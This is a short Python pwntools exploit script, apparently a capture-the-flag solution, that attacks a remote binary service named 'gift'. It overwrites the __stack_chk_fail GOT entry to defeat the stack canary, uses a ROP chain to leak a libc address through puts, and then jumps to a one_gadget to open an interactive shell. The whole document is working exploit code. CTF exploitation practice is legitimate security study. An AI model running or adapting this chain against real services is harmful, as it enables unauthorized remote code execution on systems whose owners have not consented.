#!/usr/bin/env python3
from pwn import *
context.arch = "amd64"
epath = "./gift"
lpath = "./libc.so"
e = ELF(epath)
l = ELF(lpath)
#r = process(epath, env={"LD_PRELOAD" : lpath})
r = remote("10.99.111.107", 4240)
rdi = 0x0000000000401373
ret = 0x000000000040101a

r.sendlineafter("address:", str(e.got.__stack_chk_fail))
r.sendlineafter("Value:", str(ret))
r.sendline(flat(b"\x00"*0x38,
			rdi,
			e.got.puts,
			e.sym.puts,
			e.sym.main))
r.recvline()
r.recvline()
leak = r.recv(6).ljust(8, b"\x00")
print(hex(u64(leak)))
l.address = u64(leak) - l.sym.puts
success("libc : %s" % hex(l.address))

r.sendlineafter("address:", str(e.got.__stack_chk_fail))
r.sendlineafter("Value:", str(ret))
r.sendline(flat(b"\x00"*0x38,
			0x000000000040136c, #csu
			0,
			0,
			0,
			0,
			l.address + 0xe3afe))

r.interactive()
r.close()
